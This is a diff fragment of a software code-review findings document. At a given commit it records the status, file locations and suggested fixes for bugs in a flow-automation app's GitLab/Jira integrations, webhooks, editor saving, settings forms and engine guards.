+- **Current location:** lib/integrations/gitlab/client.ts:209-221 (instanceForRepo single-instance fallback); lib/integrations/gitlab/git-host.ts:175-182 (ownsRepo), 188-203 (authedCloneUrl)
+- **Re-verification note:** With one GitLab instance registered, `instanceForRepo` still returns it for any host, so `ownsRepo` claims e.g. github.com URLs and `authedCloneUrl` embeds the GitLab PAT into a foreign-host URL. Drop the fallback (or limit it to `host === null` SSH-style URLs), and require a host match in `ownsRepo` and `authedCloneUrl`.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -711,6 +825,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-025 [High] No timeouts on any GitLab/Jira HTTP call — pollers and settings requests can hang indefinitely
+
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/gitlab/client.ts:75-82 (api), 139-145 (getJobTrace), 311-322 (testInstance); lib/integrations/jira/service.ts:76-93; lib/engine/tasks/providers/jira.ts:236 (fetchByJql)
+- **Re-verification note:** No GitLab or Jira `fetch` passes an `AbortSignal` (there are zero `signal:` / `AbortSignal` uses in `lib/integrations`), so an unreachable host stalls the poller tick and settings requests until the OS TCP timeout. Add `signal: AbortSignal.timeout(<module const>)` to each call and map `TimeoutError` to a typed error.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -730,6 +848,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-026 [High] Event stream replays the cached batch and refetches from cursor "" on remount, so events are duplicated or out of order
+
+- **Status at `abaa007`:** **Open**, fix in [Task 30](review-tasks/30-events-feed.md)
+- **Current location:** components/flows/cockpit/hooks/use-flow-events.ts:20-46; components/chat/ChatFeed.tsx (e${ev.id} keys)
+- **Re-verification note:** The hook is unchanged: the buffer (`useState`) and cursor (`useRef("")`) are per-mount while the batch stays cached under `queryKeys.flows.events(flowId)`. A remount therefore appends the cached newest batch, then refetches from cursor "" and appends history after it, producing out-of-order and duplicated events. The cursor is also mutated inside `queryFn`. Keep the merged, de-duplicated, capped array in the query cache (the `queryFn` reads the previous data and fetches `after=<last id>`), or remove the query on unmount and de-dupe by id; drop the `useEffect` append.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -760,6 +882,10 @@ Original findings, verbatim:
 
 ### CR-027 [High] Cockpit `action()` swallows HTTP errors, gives no feedback, and has no pending/double-submit guard
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 15](review-tasks/15-frontend-mutation-conventions.md)
+- **Current location:** components/flows/cockpit/FlowCockpit.tsx:65-72; components/flows/mutations/useFlowMutation.ts:13-24; callers: components/flows/panels/PanelShell.tsx:69,80, AgentView.tsx:57,62,139, DecisionView.tsx:61,66, BuildView.tsx:69-70, FanoutStepList.tsx:143,149,157, ReviewView.tsx:101,105,167, ResolveView.tsx:38,64, PipelineView.tsx:37,64, ScriptView.tsx:41, HttpView.tsx:38, StartView.tsx:47
+- **Re-verification note:** Fixed part: `action()` now goes through `postJson`, which throws on `!res.ok`, so failures are no longer treated as success, and the plan panel uses a `useMutation` wrapper (`useFlowMutation`). Remaining: cockpit panels still call the raw callback with no `useMutation`, no pending/disabled state and no visible error, and most callers don't await or catch, so a 400 becomes an unhandled rejection with no feedback. Route every panel through `useFlowMutation`, expose `isPending`/`error` from it, render an alert with retry in `PanelShell`, and disable action buttons while pending.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -787,6 +913,10 @@ Original findings, verbatim:
 
 ### CR-028 [High] NodePanel isn't keyed by node, so panel-local state leaks between nodes (including a wrong `choose_node` payload)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 35](review-tasks/35-cockpit-panel-state.md)
+- **Current location:** components/flows/panels/NodePanel.tsx:53-60 (Panel / PanelShell rendered without key); components/flows/cockpit/FlowCockpit.tsx:111; leaking state: components/flows/panels/DecisionView.tsx:30-31,66, AgentView.tsx:29-30, ArtifactViews.tsx:31,111
+- **Re-verification note:** The panel is still rendered as `<Panel />` with no `key`, so switching between two nodes served by the same component keeps the previous node's `useState`. For example, DecisionView posts node A's selection as `choose_node` for node B. Render `<Panel key={node.node_key} />` (and key the fallback `PanelShell`), or key `<NodePanel>` in the cockpit.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -808,6 +938,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-029 [High] Edits made while a save is in flight (and pending debounced prompt writes) are silently discarded
+
+- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
+- **Current location:** components/builder/hooks/use-editor-save.ts:46-115; components/template-editor/PromptTab.tsx:41-45; components/template-editor/hooks/use-debounced-callback.ts:17-47
+- **Re-verification note:** `runSave` still snapshots `machine.draft`, awaits validate, PATCH and refetch, then unconditionally `setDirty(false)` and `replaceDraft(…)`, discarding edits typed in the meantime. The debounced prompt write still captures a stale `node.config` and exposes no `flush()` (it flushes only on unmount). Flush pending debounced writes before snapshotting, compare a draft revision counter before `replaceDraft`/clearing dirty, and make debounced writers use a functional node patch.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -832,6 +966,10 @@ Original findings, verbatim:
 
 ### CR-030 [High] Save reports success for 5xx, 413 and other non-400 failures; network errors are unhandled
 
+- **Status at `abaa007`:** **Open**, fix in [Task 37](review-tasks/37-editor-save-integrity.md)
+- **Current location:** components/builder/hooks/use-editor-save.ts:92-114
+- **Re-verification note:** Success is still judged by `res.status !== 400 && !r?.error`, so 5xx or 413 responses with a non-JSON body show "Draft saved" and clear dirty. The block is still `try/finally` with no `catch`, so network or validate rejections are unhandled. Check `!res.ok`, add a `catch` that sets the error, ideally by moving the save into a TanStack `useMutation`.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -853,6 +991,10 @@ Original findings, verbatim:
 
 ### CR-031 [High] Editing HTTP "Headers" writes a string into a `Record<string,string>` field and breaks the node
 
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/components/ConfigPlainField.tsx:55-69; lib/engine/nodes/kinds/http/http-node.ts:43 (headers declared `type: "text"`); lib/engine/nodes/declarative-schemas.ts:122 (`z.record(z.string(), z.string())`)
+- **Re-verification note:** HTTP `headers` is still a `"text"` field rendered as a Textarea that writes `e.target.value` verbatim, so the first keystroke replaces the record with a string and the node config fails Zod. Add a `kv`/`json` field type (a JSON textarea with a local buffer that parses on blur and shows errors, or a key/value editor) and declare headers with it.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -872,6 +1014,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-032 [High] Client lets authors build graphs that save rejects; live validation never catches them
+
+- **Status at `abaa007`:** **Open**, fix in [Task 23](review-tasks/23-graph-semantics-and-validation.md)
+- **Current location:** components/builder/hooks/use-editor-actions.ts:173 (duplicateNode), 261 (addEdge dedupe), 336-355 (addCatalogNode: only Start is singleton); components/template-editor/draft.ts:51-60 (uniqueKey); components/template-editor/EdgeEditor.tsx:85-102; components/template-editor/components/BuilderFlow.tsx:167-175; components/template-editor/hooks/use-template-validation.ts:85-100; app/api/templates/[id]/validate/route.ts:62 (lintTemplate only); lib/engine/templates/template-store.ts:776-800 (validated)
+- **Re-verification note:** Unchanged: `/validate` still runs only `lintTemplate`, while save's `TemplateStore.validated()` also enforces built-in keys, the key regex, edge dedupe and trigger normalization, so the client can build graphs (`plan_copy`, `plan_2`, digit-leading keys, EdgeEditor self or duplicate edges, stale decision labels) that pass live validation and then fail on save. Extract the structural rules into a shared pure validator run by both `/validate` and save, and tighten the client actions (no Duplicate for built-ins, built-ins as singletons, filtered EdgeEditor targets).
 
 - **Severity:** High
 - **Category:** Correctness
@@ -905,6 +1051,10 @@ Original findings, verbatim:
 
 ### CR-033 [High] Opening the Start "fields" or Output-schema tab dirties the draft and turns catalog defaults into instance overrides
 
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/components/StartContractEditor.tsx:70-93; components/template-editor/hooks/use-output-schema-draft.ts:44-69 (eslint-disable at 68)
+- **Re-verification note:** Both components still emit `onChange` from mount and change effects, so just opening the Start "fields" or Output-schema tab dirties the draft (including on read-only built-ins) and freezes the catalog default `output_schema` into instance config. Emit only from user input handlers, derive the displayed text from `config ?? default` during render, skip writes that deep-equal the effective value, and drop the ref and `eslint-disable` workaround.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -930,6 +1080,10 @@ Original findings, verbatim:
 
 ### CR-034 [High] Path autocomplete hijacks Tab/Enter, auto-inserts the first variable, and traps keyboard focus
 
+- **Status at `abaa007`:** **Open**, fix in [Task 39](review-tasks/39-editor-fields-and-effects.md)
+- **Current location:** components/template-editor/condition-builder/PathAutocomplete.tsx:64-93 (highlight starts at 0, window capture keydown, Tab/Enter preventDefault); components/template-editor/condition-builder/PathField.tsx:45 (opens on focus); components/template-editor/condition-builder/ExpressionInput.tsx:98
+- **Re-verification note:** The popover still opens on focus with an empty token, and a window capture-phase listener turns Tab or Enter into "pick the first option", so tabbing through a path field inserts a variable and traps focus (WCAG 2.1.2). Open only on typing or ArrowDown, start `highlight` at -1, never intercept Tab, and move the handler to the input's `onKeyDown`.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 6 — Template authoring
@@ -949,6 +1103,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-035 [High] Repo form persists auto-detected policy as explicit per-repo overrides
+
+- **Status at `abaa007`:** **Open**, fix in [Task 42](review-tasks/42-settings-forms.md)
+- **Current location:** components/settings/repos/ReposSection.tsx:29-37, components/settings/repos/hooks/use-repo-form.ts:48-56, components/settings/repos/hooks/use-detected-policy.ts:19-29
+- **Re-verification note:** The effect still copies `/api/repos/detect` output into empty `install_command`/`sync_paths` whenever the editor is open, so saving an edit pins detected values as per-repo overrides and a cleared field gets refilled. Show detected values as placeholder/help text read during render, send only user-typed fields, disable the detect query when `local_path` is empty, and drop the effect + `applyDetected`.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -974,6 +1132,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-036 [High] Settings fetchers swallow every error, so error states can't render and the UI shows false empty states
+
+- **Status at `abaa007`:** **Open**, fix in [Task 14](review-tasks/14-frontend-throwing-fetchers.md)
+- **Current location:** components/settings/queries.ts:9-31, components/settings/context.tsx:68-70,94-110, app/(workspace)/settings/page.tsx:76-84, components/settings/integrations/HarnessTab.tsx:35,59-65, components/settings/repos/ReposSection.tsx:78
+- **Re-verification note:** The settings-local `fetchJson(url, fallback)` still swallows HTTP/network errors, so the three provider queries never enter `isError`; a failed `/api/repos` shows "No repos registered yet", a failed `/api/settings` shows "No harness connected" or "Settings are unavailable" with no retry. Switch the three queries to the throwing `@/hooks/fetch-json`, expose `isError`/`refetch` per query from `SettingsProvider`, render error+Retry before empty states, and rename the resilient helper (only `useDetectedPolicy` needs it).
 
 - **Severity:** High
 - **Category:** Correctness
@@ -1004,6 +1166,10 @@ Original findings, verbatim:
 
 ### CR-037 [High] Tasks feed ignores query errors, so a failed provider fetch renders as "No tasks match the current filters"
 
+- **Status at `abaa007`:** **Open**, fix in [Task 43](review-tasks/43-tasks-feature.md)
+- **Current location:** components/tasks/hooks/use-live-tasks.ts:35-39,52-69, components/tasks/TasksView.tsx:53,111,137-148
+- **Re-verification note:** `useLiveTasks` still never returns `query.isError`/`query.error`; only `staleError` (payload.error) and the force-refresh mutation error reach `TasksView`, so a 502/500 with no cached data renders "No tasks match the current filters" with no banner or Retry. Return `queryError: query.error?.message`, fold it into `error` in TasksView, and keep rows visible on background failures.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 7a — Settings, tasks, shared UI, constants, types
@@ -1022,6 +1188,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-038 [High] `saveSettings` silently drops failed PATCHes; local-agent toggles (sandbox / --force) fail without feedback
+
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** components/settings/context.tsx:81-92, components/settings/integrations/hooks/use-local-agent-options.ts:17-32
+- **Re-verification note:** `saveSettings` still returns silently on `!res.ok`, and `useLocalAgentOptions` fires it with `void ….finally()`, so a failed Sandbox/--force toggle gives no feedback (network errors become unhandled rejections). Delete `saveSettings` from the context, use `usePatchSettings()` in the hook (derive in-flight field from `mutation.variables`/`isPending`), and thread the tab's `onError` into the mutation.
 
 - **Severity:** High
 - **Category:** Correctness
@@ -1043,6 +1213,9 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-039 [High] Lint toolchain is not installed (eslint deps missing from the lockfile), so `npm run lint` cannot run and no AGENTS.md §5 rule is enforced
+
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** The lockfile now includes eslint/eslint-config-next/@eslint/eslintrc, `node_modules/.bin/eslint` is installed, and `npm run lint` runs (0 errors, 143 warnings). Residuals tracked elsewhere: `next.config.mjs:9` still has `eslint.ignoreDuringBuilds: true` and `lib/`+`scripts/` rules are downgraded to warn in `eslint.config.mjs`.
 
 - **Severity:** High
 - **Category:** Boundaries (sources: TOOL-01: Boundaries; NODE-44: Code quality)
@@ -1085,6 +1258,10 @@ Original findings, verbatim:
 
 ### CR-040 [High] `.env.example` sets `DATABASE_PATH`, which defeats the production-DB separation, so `next start` uses the demo/seed DB
 
+- **Status at `abaa007`:** **Open**, fix in [Task 06](review-tasks/06-db-path-and-seed-safety.md)
+- **Current location:** .env.example:2, lib/config.ts:28-46, scripts/init-prod-db.mjs:16, README.md:50, README.md:227-228
+- **Re-verification note:** `.env.example` still sets `DATABASE_PATH=./data/devflow.db` and README still says `cp .env.example .env`, so `DatabaseConfig.path()` never takes the `devflow.prod.db` branch under `next start` and production shares the seed/demo DB; `db:init:prod` creates a file the server then ignores. Comment out `DATABASE_PATH` in `.env.example` (or split `DEMO_DATABASE_PATH`/`DATABASE_PATH`) and have `init-prod-db.mjs` warn when `DATABASE_PATH` is set.
+
 - **Severity:** High
 - **Category:** Correctness
 - **Area:** Area 7b — Tooling & config
@@ -1104,6 +1281,11 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-041 [High] No test runner and no tests anywhere, although the Definition of Done requires tests for service classes and row mappers
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 05](review-tasks/05-test-coverage-baseline.md)
+- **Current severity:** Medium (was High)
+- **Current location:** lib/db/rows.ts, lib/engine/templates/template-yaml.ts, lib/engine/templates/template-lint.ts, lib/engine/nodes/kinds/start/contract.ts, lib/git/worktrees.ts, lib/git/dep-policy.ts, lib/integrations/gitlab/git-host.ts, lib/net/ssrf-guard.ts, tests/plan-diff.test.ts
+- **Re-verification note:** vitest, `vitest.config.mts` (server-only stub + `@` alias), the `test` script and 23 test files now exist (plan node/store/contract, split, agent output errors, a DB column-migration test). Still missing: tests for the `lib/db/rows.ts` mappers, `parseTemplateYaml` + an import-every-`docs/flow-templates/*.yaml` test, template-lint, start-contract coercion, and the git/dep-policy/GitLab/SSRF helpers; `tsc --noEmit` also fails in `tests/plan-diff.test.ts`, which vitest does not type-check.
 
 - **Severity:** High
 - **Category:** Code quality
@@ -1167,6 +1349,10 @@ Original findings, verbatim:
 
 ### CR-042 [Medium] `update_plan_steps` with no `steps` field deletes the whole plan checklist
 
+- **Status at `abaa007`:** **Open**, fix in [Task 10](review-tasks/10-api-input-validation-flows.md)
+- **Current location:** app/api/flows/[id]/action/route.ts:38, lib/engine/flow-engine.ts:802-834
+- **Re-verification note:** `update_plan_steps` still maps a missing `steps` to `[]`; `updatePlanSteps` now refuses removing steps with active/merged children, but every other (deletable) step is silently wiped. Validate `steps` as a required array at the route boundary (Zod, like `splitUnitBody`) and drop the `?? []`; review `config ?? {}` / `chosen ?? []` too.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1182,6 +1368,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-043 [Medium] The generic webhook records a delivery as seen before dispatching it, so failed deliveries are lost on retry
+
+- **Status at `abaa007`:** **Open**, fix in [Task 29](review-tasks/29-webhook-reliability.md)
+- **Current location:** app/api/hooks/[id]/route.ts:43-46,53-79, lib/engine/runtime/hook-store.ts:150-171
+- **Re-verification note:** `deliverySeen` still inserts the `webhook-id` before the JSONata filter and dispatch, so a delivery whose filter evaluation or `startFromTemplate`/`resumeNodeFromWebhook` fails is answered `{dedup:true}` on retry and never processed. Split into `isSeen`/`markSeen` and mark only after successful dispatch or a deliberate filter drop.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1200,6 +1390,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-044 [Medium] The GitLab webhook parses the body before auth and has no error handling around engine calls
+
+- **Status at `abaa007`:** **Open**, fix in [Task 29](review-tasks/29-webhook-reliability.md)
+- **Current location:** app/api/webhooks/gitlab/route.ts:8-10,27-30,37-74, lib/engine/nodes/chains/sdlc-chain.ts:142-145
+- **Re-verification note:** The route still does `await req.json()` before `verifyWebhook`, has no try/catch around `ingestComments`/`emitEvent`/`triggerPipelineGate` (which throws "no pipeline gate node" for gate-less templates → 500 → GitLab retries/disables the hook), and keeps the duplicate `flowScheduleFallback`. Verify first, parse with `.catch(() => null)` → 400, move handling into a `flowEngine.handleHostEvent(event)` and log domain errors while returning 200.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1223,6 +1417,10 @@ Original findings, verbatim:
 
 ### CR-045 [Medium] GET handlers and server loaders start the poller and run the reconciler as side effects
 
+- **Status at `abaa007`:** **Open**, fix in [Task 25](review-tasks/25-wait-timers-and-poller.md)
+- **Current location:** app/api/flows/route.ts:8,13, app/api/flows/[id]/route.ts:9,14, app/api/flows/[id]/events/route.ts:11, loaders/flows.ts:25,28,42, app/api/hooks/[id]/route.ts:63, app/api/webhooks/gitlab/route.ts:33
+- **Re-verification note:** GET handlers and loaders still call `flowPoller.start()` and fire `reconciler.reconcileFlow(id)` (for any id, every 3 s from the events poll) with errors swallowed by `.catch(() => {})`; there is still no `instrumentation.ts`. Start the poller once from `instrumentation.ts` `register()`, move reconcile onto the poller tick or an explicit POST, and log reconcile failures.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1241,6 +1439,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-046 [Medium] No typed error classes: the engine throws bare `Error`, so routes map almost everything to 400 (or leak an unhandled 500)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 09](review-tasks/09-typed-errors.md)
+- **Current location:** app/api/flows/[id]/action/route.ts:124-130, app/api/flows/[id]/chat/route.ts:27-29, app/api/templates/[id]/route.ts:72-77,132-134, app/api/hooks/[id]/route.ts:77-79, app/api/host-instances/[host]/[id]/route.ts:6-36, app/api/settings/route.ts, app/api/webhooks/gitlab/route.ts, lib/engine/flow-engine.ts:548,574,1667, lib/integrations/gitlab/git-host.ts:223,238
+- **Re-verification note:** Still no `NotFoundError`/`ConflictError`/`ValidationError`; the engine throws bare `Error` ("flow not found", "already running", "host instance not found") and routes map everything to 400 or leak an unhandled 500 (host-instances, settings, gitlab webhook). The action route's new `httpStatus` duck-typing is dead code (nothing in `lib/` sets it). Add a shared errors module + `toErrorResponse(e)` helper and use it across routes.
 
 - **Severity:** Medium
 - **Category:** Correctness (sources: APP-10: Correctness; ENG-28: Boundaries)
@@ -1296,6 +1498,10 @@ Original findings, verbatim:
 
 ### CR-047 [Medium] The events endpoint does not validate `limit`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 10](review-tasks/10-api-input-validation-flows.md)
+- **Current location:** app/api/flows/[id]/events/route.ts:14-18
+- **Re-verification note:** `limit` is still `Number(searchParams.get("limit") ?? 200)` passed straight to SQLite: `?limit=abc` → NaN → 500, `?limit=-1` → unbounded event dump. Parse with `z.coerce.number().int().min(1).max(500).default(200)` and move the query into a `db.listEvents(flowId, after, limit)` method.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1312,6 +1518,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-048 [Medium] Settings PATCH writes some fields and then rejects later ones
+
+- **Status at `abaa007`:** **Open**, fix in [Task 11](review-tasks/11-api-input-validation-settings.md)
+- **Current location:** app/api/settings/route.ts:104-178
+- **Re-verification note:** PATCH still validates and writes field by field, so a bad later field (`default_execution_mode`, `local_agent.timeout_ms`, a non-string secret, `http_allowlist`) returns 400 after earlier fields (API key, harness, …) were already persisted. Validate the whole body up front with one Zod schema, then apply all writes in one `db.transaction` inside a `SettingsService.update(patch)`.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1332,6 +1542,11 @@ Original findings, verbatim:
 
 ### CR-049 [Medium] The prompt preview route is a 230-line switch on node key instead of a registry method
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 28](review-tasks/28-prompt-preview-parity.md)
+- **Current severity:** Low (was Medium)
+- **Current location:** lib/engine/prompts/prompt-preview.ts:90-108,126
+- **Re-verification note:** The 230-line switch is gone: `/prompt` and `/prompts` routes are thin and each def builds its own preview via `nodeRoles.promptPreviewerOf(def).previewPrompt(...)` in the `PromptPreview` service. What remains is the branch-scoped plan special case, reached through an unchecked `nodeRegistry.get(NODE_KEYS.PLAN) as unknown as SubPlanPreviewer` downcast, plus the hardcoded `"pipeline_fix"` → `fix_prompt_rules` mapping; fold both into the previewer role (pass `branch` through `PromptPreviewParams`, return `rulesKey` from the def).
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1351,6 +1566,10 @@ Original findings, verbatim:
 
 ### CR-050 [Medium] Template save creates draft node templates in the route, with a manual, non-transactional rollback
 
+- **Status at `abaa007`:** **Open**, fix in [Task 12](review-tasks/12-db-transactions.md)
+- **Current location:** app/api/templates/[id]/route.ts:49-77,89-125
+- **Re-verification note:** `applyDraftNodeTemplates` still lives in the route, mutates the request body, creates rows one by one, and rolls back by deleting them with errors swallowed (`catch { /* keep rolling back */ }`), with no transaction around create + `templateStore.update`. Move into `TemplateStore.saveWithDrafts(id, input)` wrapped in a single `db.transaction`.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1369,6 +1588,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-051 [Medium] Routes run raw SQL and domain logic instead of calling service methods
+
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current location:** app/api/templates/[id]/preview/route.ts:54,80,85,117,133,147, app/api/status/route.ts:12,30-31, app/api/flows/[id]/comments/route.ts, app/api/flows/[id]/events/route.ts:15-18, app/api/artifacts/[id]/route.ts:12, app/api/flows/worktree-status/route.ts:20, app/api/graph/route.ts, app/api/models/route.ts:74, app/api/contracts/route.ts, app/api/templates/[id]/validate/route.ts:54, app/api/tasks/handlers.ts:30, app/api/node-templates/route.ts:20-48, app/api/webhooks/gitlab/route.ts:64-66
+- **Re-verification note:** Routes still run raw SQL and domain logic (preview sample context, status snapshot, comment mapping, worktree status, model-catalog normalization, contracts, validate's copy of `taskUniverse`, `tasks/handlers.ts` UPDATE, node-template auto-naming/slugging). Move each block into its owning service (TemplateStore, StatusService, ModelCatalogService, …), delete `app/api/tasks/handlers.ts`, and add tests for the new services.
 
 - **Severity:** Medium
 - **Category:** Boundaries
@@ -1407,6 +1630,10 @@ Original findings, verbatim:
 
 ### CR-052 [Medium] The Settings pages are client components that fetch their data on the client
 
+- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
+- **Current location:** app/(workspace)/settings/page.tsx:1,11-50, app/(workspace)/settings/integrations/page.tsx:1, app/(workspace)/settings/repositories/page.tsx:1, app/(workspace)/settings/layout.tsx:1-6, app/(workspace)/settings/loading.tsx
+- **Re-verification note:** All three settings pages are still `"use client"` and get their data client-side via `SettingsProvider`; there is no `loaders/settings.ts`, and `GeneralSkeleton` duplicates `settings/loading.tsx`. Add a settings loader, make pages Server Components that prefetch into `HydrationBoundary`, and move the interactive bodies into client islands that reuse the `loading.tsx` skeleton.
+
 - **Severity:** Medium
 - **Category:** Boundaries
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1426,6 +1653,11 @@ Original findings, verbatim:
 
 ### CR-053 [Medium] Node-template responses are serialized differently in different places, and the create/update responses lack `is_local`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
+- **Current severity:** Low (was Medium)
+- **Current location:** app/api/node-templates/route.ts:58, app/api/node-templates/[id]/route.ts:24,28, loaders/templates.ts:76-88, lib/engine/templates/template-store.ts:63
+- **Re-verification note:** Three serializations still exist: POST/PATCH return `{...nt, is_builtin}` without `is_local`, `loadNodeCatalog` builds its own shape, and `serializeNodeTemplate` stays unexported; the loader comment still wrongly says it matches the GET. Current clients only invalidate (never write the mutation result into the cache), so the impact is latent. Export one serializer (or `templateStore.catalogRows()`) and use it in all three places.
+
 - **Severity:** Medium
 - **Category:** Code quality
 - **Area:** Area 1 — App/API (app/, loaders/)
@@ -1440,6 +1672,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-054 [Medium] Node start guards are check-then-act, and `startPlan`/`refinePlan`/`sendChat` have no guard at all
+
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/flow-engine.ts:1482-1520,1658-1692,1726-1746,1878-1892,1165, lib/engine/nodes/kinds/plan/plan-node.ts:220-241
+- **Re-verification note:** `startPlan`/`refinePlan` are gone; plan turns now go through `sendChat`, which still has no status guard, so a double send/second tab launches two concurrent plan turns (each sets `running` itself in `runPlanTurn`). `runNodeManual`, `retryNode` and `resumeNodeFromWebhook` still check status and then defer the real `running` write into `bg()`, leaving a check-then-act window. Add an atomic `claimNode(flowId, key, fromStatuses)` (`UPDATE … WHERE status IN (…)`, check `changes===1`) called synchronously before `bg()` in every trigger path.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1463,6 +1699,10 @@ Original findings, verbatim:
 
 ### CR-055 [Medium] `approvePlan` does not check the plan node's status, so approving during a refine silently discards the refine
 
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/flow-engine.ts:1336-1388, lib/engine/harness/agent-runner.ts:171-182
+- **Re-verification note:** `approvePlan` still approves the latest plan artifact and sets the node `approved` regardless of its status, so approving during an in-flight refine starts the build on the old version and the late-write guard then discards the refine. Require `awaiting_approval` (via the claim helper) and throw a typed conflict error otherwise.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1481,6 +1721,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-056 [Medium] `cancelNode` has no status guard and does not stop cloud runs
+
+- **Status at `abaa007`:** **Open**, fix in [Task 17](review-tasks/17-node-claim-and-attempts.md)
+- **Current location:** lib/engine/flow-engine.ts:1698-1718
+- **Re-verification note:** `cancelNode` still has no status guard (a `done`/`approved`/`awaiting_approval` node is forced to `failed`), still only calls `cancel` for local mode so cloud agents keep running and billing, and never clears the `waitTimers` entry. Allow cancel only from `running`/`waiting` (pending via an explicit flag for the skip path), call `agentPortRegistry.forMode(flow.execution_mode).cancel(...)` for both modes, and delete the timer.
 
 - **Severity:** Medium
 - **Category:** Correctness
@@ -1505,6 +1749,10 @@ Original findings, verbatim:
 
 ### CR-057 [Medium] A double approve of a code step child starts a second merge loop that flips the merged step to `failed`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:677-707,727, lib/engine/runtime/fanout/merge-arena.ts:56-58
+- **Re-verification note:** `approveChildStep` still only checks `status === "awaiting_approval"`, which stays true during merge-back, so a double approve launches a second `runMergeBack` that later fails fetching the deleted branch and flips the merged step to `failed`. Reject when `mergeArena.isMerging(childFlowId)`, a `step_merges` row is running, or `completed_by === 'merge'`; better, move the child to a distinct merging state atomically.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1523,6 +1771,10 @@ Original findings, verbatim:
 
 ### CR-058 [Medium] Step-child code assumes one node per child flow, but explicit child templates can have several
 
+- **Status at `abaa007`:** **Open**, fix in [Task 19](review-tasks/19-fanout-rollup-and-promises.md)
+- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:685,879,913,923,931, lib/engine/runtime/flow-reconciler.ts:183,193, lib/engine/flow-engine.ts:1643-1647, lib/engine/runtime/split/split-manager.ts:660,673, lib/engine/templates/template-lint.ts:212-235
+- **Re-verification note:** Step-child code still uses `SELECT … FROM nodes WHERE flow_id=?` with no `node_key`/`ORDER BY` for approve, merge resume, and reconcile, while lint only forbids SDLC built-ins in `knob.child` templates and never checks the node count. Resolve the child's work node key once (store it in the trigger payload) and query by it, or enforce one-node children in template-lint.
+
 - **Severity:** Medium
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -1538,6 +1790,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-059 [Medium] `mergeArena` is a plain module singleton even though it holds process state that reconcile relies on
+
+- **Status at `abaa007`:** **Open**, fix in [Task 20](review-tasks/20-merge-arena-and-workspaces.md)
